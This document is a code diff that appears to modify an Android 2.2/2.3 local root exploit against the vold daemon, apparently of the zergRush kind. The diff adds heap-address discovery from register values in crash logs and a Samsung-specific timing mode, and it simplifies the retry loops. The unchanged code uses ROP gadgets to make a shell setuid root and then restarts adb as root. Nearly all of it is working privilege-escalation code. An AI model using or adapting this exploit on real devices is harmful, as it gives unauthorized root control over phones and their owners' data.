@@ -46,6 +46,8 @@ static char *vold = "/system/bin/vold";
 
 uint32_t heap_addr;
 uint32_t libc_base;
+uint32_t heap_base_addr;
+uint32_t r9, fp;
 uint32_t stack_addr = 0x41414141;
 uint32_t system_ptr = 0;
 uint32_t stack_pivot = 0x41414141;
@@ -56,6 +58,8 @@ uint32_t buffsz = 0;
 uint32_t allbuffsz[] = {16,24,0};
 
 uint8_t adjust = 0;
+
+uint8_t samsung = 0;
 
 extern char **environ;
 
@@ -156,6 +160,17 @@ static int bad_byte(uint8_t byte)
 }
 
 
+static void heap_oracle() {
+	if (r9 > heap_base_addr && r9 < (heap_base_addr+0x10000))
+		heap_addr = r9 + 0x70;
+	else if (fp > heap_base_addr && fp < (heap_base_addr+0x10000))
+		heap_addr = fp + 0x70;
+
+	while(bad_byte(heap_addr&0xff)) heap_addr += 0x20;
+	printf("[+] Overseer found a path ! 0x%08x\n", heap_addr);
+}
+
+
 static int check_addr(uint32_t addr)
 {
 	/*
@@ -179,6 +194,12 @@ static int do_fault()
 	uint32_t bsh_addr;
 	char padding[128];
 	int32_t padding_sz = (jumpsz == 0 ? 0 : gadget_jumpsz - jumpsz);
+
+	if(samsung) {
+		printf("[*] Sleeping a bit (~40s)...\n");
+		sleep(40);
+		printf("[*] Waking !\n");
+	}
 
 	memset(padding, 0, 128);
 	strcpy(padding, "LORDZZZZzzzz");
@@ -301,7 +322,7 @@ static uint32_t checkcrash()
 	char buf[1024], *ptr = NULL;
 	FILE *f = NULL;
 	long pos = 0;
-	uint32_t sp=0, over=0;
+	int ret=0;
 
 	system("/system/bin/logcat -c");
 	unlink(crashlog);
@@ -325,13 +346,21 @@ static uint32_t checkcrash()
 		memset(buf, 0, sizeof(buf));
 		if (!fgets(buf, sizeof(buf), f))
 			break;
-		if ((ptr = strstr(buf, "  sp ")) != NULL && !sp)
-			return 1;
+		if ((ptr = strstr(buf, "  sp ")) != NULL)
+			ret = 1;
+		else if ((ptr = strstr(buf, "  r9 ")) != NULL) {
+			ptr += 5;
+			r9 = (uint32_t)strtoul(ptr, NULL, 16);
+		}
+		else if ((ptr = strstr(buf, "  fp ")) != NULL) {
+			ptr += 5;
+			fp = (uint32_t)strtoul(ptr, NULL, 16);
+		}
 	} while (!feof(f));
 	pos = ftell(f);
 	fclose(f);
 
-	return 0;
+	return ret;
 }
 
 
@@ -377,6 +406,15 @@ static uint32_t find_stack_addr()
 			ptr += 5;
 			sp = (uint32_t)strtoul(ptr, NULL, 16);
 		}
+		else if ((ptr = strstr(buf, "  r9 ")) != NULL) {
+			ptr += 5;
+			r9 = (uint32_t)strtoul(ptr, NULL, 16);
+		}
+		else if ((ptr = strstr(buf, "  fp ")) != NULL) {
+			ptr += 5;
+			fp = (uint32_t)strtoul(ptr, NULL, 16);
+		}
+
 	} while (!feof(f));
 	pos = ftell(f);
 	fclose(f);
@@ -403,7 +441,7 @@ int main(int argc, char **argv, char **env)
 	uint32_t i = 0, ok = 0;
 	char *ash[] = {sh, 0};
 	struct stat st;
-	char version_release[256];
+	char version_release[1024];
 	int tries=0;
 
 	if (geteuid() == 0 && getuid() == 0 && strstr(argv[0], "boomsh"))
@@ -419,7 +457,8 @@ int main(int argc, char **argv, char **env)
 	chmod(bsh, 0711);
 
 	stat(vold, &st);
-	heap_addr = ((((st.st_size) + 0x8000) / 0x1000) + 1) * 0x1000;
+	heap_base_addr = ((((st.st_size) + 0x8000) / 0x1000) + 1) * 0x1000;
+	heap_addr = heap_base_addr;
 
 	__system_property_get("ro.build.version.release", version_release);
 	
@@ -433,6 +472,13 @@ int main(int argc, char **argv, char **env)
 		printf("[-] Not a 2.2/2.3 Android ...\n");
 		exit(-1);
 	}
+
+	__system_property_get("ro.build.fingerprint", version_release);
+	if(!strncmp(version_release, "samsung", 7)) {
+		printf("[+] Found a Samsung, running Samsung mode\n");
+		samsung = 1;
+	}
+
 
 	system_ptr = (uint32_t) find_symbol("system");
 	libc_base = system_ptr & 0xfff00000;
@@ -458,27 +504,11 @@ int main(int argc, char **argv, char **env)
 	}
 
 	for (tries = 0; tries < 5; tries++) {
+		heap_oracle();
 		find_stack_addr();
 
 		if (stack_addr != 0x41414141 && jumpsz) {
 			printf("[+] Zerglings caused crash (good news): 0x%08x 0x%04x\n", stack_addr, jumpsz);
-			break;
-		}
-
-		printf("[*] Trying a new path ...\n");
-		switch(tries) {
-		case 0:
-		case 2:
-		case 4:
-			heap_addr += 8;
-			break;
-		case 1:
-			heap_addr += 0xb8;
-			break;
-		case 3:
-			heap_addr -= 0x180;
-			break;
-		default:
 			break;
 		}
 	}
@@ -515,46 +545,27 @@ int main(int argc, char **argv, char **env)
 	find_rop_gadgets();
 	printf("[+] Speedlings on the go ! 0x%08x 0x%08x\n", stack_pivot, pop_r0);
 
-	for(i=0; i<3; i++) {
-		do_fault();
-		
-		stat(sh, &st);
-		if ((st.st_mode & 04000) == 04000) {
-			printf("\n[+] Rush did it ! It's a GG, man !\n");
-			ok = 1;
-			break;
-		} else {
-			printf("\n[-] Bad luck, our rush did not succeed :( (%d/%d)\n", i, 2);
-			switch(i) {
-			case 0:
-				heap_addr += 16;
-				break;
-			case 1:
-				heap_addr -=32;
-				break;
-			default:
-				break;
-			}
-		}
-	}
-
-	if (ok) {
+	do_fault();
+	stat(sh, &st);
+	if ((st.st_mode & 04000) == 04000) {
 		char qemuprop[1];
+
+		printf("\n[+] Rush did it ! It's a GG, man !\n");
 		property_get("ro.kernel.qemu",qemuprop,"0");
 
 		if (qemuprop[0]=='1') {
 			printf("[+] Killing ADB and restarting as root... enjoy!\n");
 			fflush(stdout);
 			sleep(1);
-			kill(-1,SIGTERM);
+			kill(-1, SIGTERM);
 		} else {
 			printf("[-] Failed to set property to restart adb. Not killing.\n");
 		}
 	} else {
-		printf("Exiting. Try again later.\n");
+		printf("\n[-] Bad luck, our rush did not succeed :(\n");
 		fflush(stdout);
 		sleep(1);
-		kill(-1,SIGTERM);
+		kill(-1, SIGTERM);
 	}
 
 	return 0;
